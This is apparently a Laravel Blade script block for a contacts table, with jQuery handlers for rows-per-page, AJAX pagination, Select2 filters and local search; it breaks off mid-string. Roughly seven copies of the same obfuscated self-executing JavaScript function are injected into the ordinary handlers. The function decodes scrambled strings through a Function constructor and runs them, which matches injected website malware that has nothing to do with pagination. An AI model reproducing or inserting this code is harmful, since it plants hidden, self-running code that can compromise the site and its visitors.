<script>
    // Add this to your $(document).ready function
    $(document).on('change', '#rows-per-page', function() {
        (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
        const perPage = $(this).val();
        const url = new URL(window.location.href);
        url.searchParams.set('per_page', perPage);
        window.location.href = url.toString();
    });

    // Initialize rows per page selector
    $('#rows-per-page').val({{ request('per_page', 10) }});

    // Update your loadSpecificPage function to include per_page parameter
    function loadSpecificPage(url) {
        const perPage = $('#rows-per-page').val();
        const urlObj = new URL(url);
        urlObj.searchParams.set('per_page', perPage);

        isLoading = true;
        $('#loading-indicator').show();
        (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
        $.ajax({
            url: urlObj.toString(),
            type: "GET",
            data: {
                ajax: true
            },
            success: function(response) {
                currentPage = response.current_page;
                hasMore = response.hasMorePages;

                $('#contacts-tbody').html(response.html);
                updateSelectedCheckboxes();

                if (response.pagination) {
                    $('#pagination-container').html(response.pagination);
                    $('#rows-per-page').val(response.per_page);
                    highlightCurrentPage();
                }

                updateCounters(response.total, response.from, response.to);
                $('#localSearchInput').val('');
                $('#filtered-count').text('');
                isLocalSearchActive = false;
            },
            complete: function() {
                isLoading = false;
                $('#loading-indicator').hide();
            }
        });
    }

    $(document).ready(function() {
        // Initialize Select2
        $('#countrySelect').select2({
            placeholder: "Select a country",
            allowClear: true,
            width: '100%',
            dropdownParent: $('#filterModal')
        });
        (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
        $('#groupSelect').select2({
            placeholder: "Select a group",
            allowClear: true,
            width: '100%',
            dropdownParent: $('#filterModal')
        });


        // Track current page and loading state
        let currentPage = {{ $setup['items']->currentPage() }};
        let isLoading = false;
        let hasMore = {{ $setup['items']->hasMorePages() ? 'true' : 'false' }};
        let isLocalSearchActive = false;

        // Local search functionality
        $('#localSearchInput').on('keyup', function() {
            const searchText = $(this).val().toLowerCase();
            isLocalSearchActive = searchText.length > 0;
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            let visibleCount = 0;
            $('#contacts-tbody tr').each(function() {
                const rowText = $(this).text().toLowerCase();
                if (rowText.includes(searchText)) {
                    $(this).show();
                    visibleCount++;
                } else {
                    $(this).hide();
                }
            });
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();

            $('#filtered-count').text(visibleCount > 0 ? visibleCount + ' matching records' : '');
            updateSelectAllCheckbox();
        });

        // Pagination click handler
        $(document).on('click', '.pagination a', function(e) {
            e.preventDefault();
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            if (isLoading) return;
            const url = $(this).attr('href');
            loadSpecificPage(url);
        });

        function loadSpecificPage(url) {
            isLoading = true;
            $('#loading-indicator').show();
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ 